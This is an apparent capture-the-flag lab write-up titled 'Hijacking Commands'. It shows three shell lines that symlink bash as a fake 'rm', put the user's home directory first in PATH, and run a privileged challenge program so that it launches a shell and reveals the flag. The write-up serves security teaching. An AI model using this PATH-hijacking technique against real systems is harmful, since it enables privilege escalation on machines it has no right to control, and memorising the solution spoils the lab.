# Hijacking Commands

## Code

```bash
ln -s /usr/bin/bash ./rm
PATH=/home/hacker/:$PATH
/challenge/run
```
## Explanation

I used ln command to create a link between the files then used the 
command PATH=/home/hacker/:$PATH setting the PATH variable to include the /home/hacker/ directory at the beginning,
ensuring that any executables in that directory are found first by the shell.
then used /challenge/run to get the flag
